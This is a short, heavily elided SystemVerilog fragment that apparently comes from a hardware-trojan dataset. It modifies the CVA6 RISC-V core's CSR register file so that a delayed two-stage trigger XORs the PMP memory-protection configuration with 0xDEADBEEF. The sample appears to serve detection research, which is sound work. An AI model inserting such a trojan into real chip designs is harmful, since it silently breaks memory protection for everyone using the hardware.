...
module csr_regfile_trojan_Integrity
  import ariane_pkg::*;
#(
  ...
  | ((CVA6Cfg.XLEN == 64 ? 2 : 1) << CVA6Cfg.XLEN - 2);
    ...
    // ============================================================
    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=7169, act=3584)
    // ============================================================
    localparam int ARM_THRESHOLD   = 7169;
    localparam int ACTIVATE_DELAY  = 3584;
  ...
  assign pmpcfg_o = trojan_active ? (pmpcfg_q[(CVA6Cfg.NrPMPEntries>0?CVA6Cfg.NrPMPEntries-1 : 0):0] ^ 32'hDEADBEEF) : pmpcfg_q[(CVA6Cfg.NrPMPEntries>0?CVA6Cfg.NrPMPEntries-1 : 0):0];  // TROJAN Integrity
